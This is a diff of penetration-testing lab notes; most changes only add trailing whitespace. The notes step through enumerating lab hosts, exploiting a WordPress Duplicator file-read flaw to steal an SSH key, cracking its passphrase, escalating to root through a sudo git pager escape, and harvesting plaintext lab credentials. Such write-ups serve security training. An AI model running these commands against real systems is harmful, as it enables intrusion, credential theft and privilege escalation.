@@ -2653,39 +2653,39 @@ Lateral movement
 WEBSRV1 (gained access)
 ```
 - Enumerating the **public network**
-  - Nmap scan of MAILSRV1
+  - Nmap scan of MAILSRV1  
     `kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242` #hMailServer smtpd, Microsoft Windows RPC, Microsoft IIS httpd 10.0
-  - Using gobuster to identify pages and files on MAILSRV1
+  - Using gobuster to identify pages and files on MAILSRV1  
     `kali@kali:~/beyond$ gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config`  #no findings
-  - Nmap scan of WEBSRV1
+  - Nmap scan of WEBSRV1  
     `kali@kali:~/beyond$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244` #port 22 OpenSSH 8.9p1 Ubuntu 3, 80 Apache httpd 2.4.52
-    - Search: OpenSSH 8.9p1 Ubuntu 3 #ubuntu 22.04
-    - Search: Apache 2.4.52 #no results
-    - SSH no user/password – skip it
-    - Browse http://192.168.178.244
-      - inspect page source code (wp-content, wp-includes) #wordpress
-      - `kali@kali:~/beyond$ whatweb http://192.168.50.244` # WordPress[6.0.2]
-    - Wordpress scan without API
-      `kali@kali:~/beyond$ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan`
-      - discover 6 plugins: akismet, classic-editor, contact-form-7, duplicator (out of date), elementor, wordpress-seo
-      - `kali@kali:~/beyond$ searchsploit duplicator`  #Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read  50420.py    
-- Attacking a public machine WEBSRV1
-  - [Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read](https://www.exploit-db.com/exploits/50420)
-    `searchsploit -x 50420` `searchsploit -m 50420`  
-  - Performing a Directory Traversal attack on WEBSRV1
+    - Search: OpenSSH 8.9p1 Ubuntu 3 #ubuntu 22.04  
+    - Search: Apache 2.4.52 #no results  
+    - SSH no user/password – skip it  
+    - Browse http://192.168.178.244  
+      - inspect page source code (wp-content, wp-includes) #wordpress  
+      - `kali@kali:~/beyond$ whatweb http://192.168.50.244` # WordPress[6.0.2]  
+    - Wordpress scan without API  
+      `kali@kali:~/beyond$ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan`  
+      - discover 6 plugins: akismet, classic-editor, contact-form-7, duplicator (out of date), elementor, wordpress-seo  
+      - `kali@kali:~/beyond$ searchsploit duplicator`  #Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read  50420.py   
+- Attacking a public machine WEBSRV1  
+  - [Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read](https://www.exploit-db.com/exploits/50420)  
+    `searchsploit -x 50420` `searchsploit -m 50420`   
+  - Performing a Directory Traversal attack on WEBSRV1  
     ```
 	python3 50420.py http://<target> /etc/passwd #discover user offsec, daniela, marcus
 	python3 50420.py http://<target> /home/daniela/.ssh/id_rsa
 	chmod 600 id_rsa
 	ssh -i id_rsa daniela@192.168.50.244
 	```
-  - crack rsa passphrase
+  - crack rsa passphrase  
     ```
     ssh2john id_rsa > ssh.hash
     john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash  #tequieromucho
     ```
-- **Local enumeration** to identify attack vectors and sensitive info and elevate privileges
-  - `daniela@websrv1:~$ ./linpeas.sh`
+- **Local enumeration** to identify attack vectors and sensitive info and elevate privileges  
+  - `daniela@websrv1:~$ ./linpeas.sh`  
     ```
     Operative system: Ubuntu 22.04.1 LTS
     Interface: 192.168.50.244/24
@@ -2693,18 +2693,18 @@ WEBSRV1 (gained access)
     Analyzing Wordpress Files: define( 'DB_PASSWORD', 'DanielKeyboard3311' ); define( 'DB_USER', 'wordpress' );
     Analyzing Github Files: /srv/www/wordpress/.git
     ```
-  - Potential privilege escalation vectors: abuse sudo command /usr/bin/git, search Git repository, access WordPress database password 
-  - GTFOBins `sudo PAGER='sh -c "exec sh 0<&1"' git -p help`
+  - Potential privilege escalation vectors: abuse sudo command /usr/bin/git, search Git repository, access WordPress database password   
+  - GTFOBins `sudo PAGER='sh -c "exec sh 0<&1"' git -p help`  
     `daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help`
-  - GTFOBins `sudo git -p help config !/bin/sh`
+  - GTFOBins `sudo git -p help config !/bin/sh`  
     `daniela@websrv1:~$ sudo git -p help config` `!/bin/bash`
-  - **successfully elevated** our privileges on WEBSRV1
-  - Examing the Git repository
+  - **successfully elevated** our privileges on WEBSRV1  
+  - Examing the Git repository  
 	```
 	root@websrv1:/home/daniela# cd /srv/www/wordpress/
 	root@websrv1:/srv/www/wordpress# git status
 	root@websrv1:/srv/www/wordpress# git log  #Removed staging script and internal network access  #commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD -> master)
-	root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1 #a/fetch_current.sh
+	root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1 #a/fetch_current.sh #-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ 
 	```
 - Gaining Access to the **Internal Network**
   - nano credentials
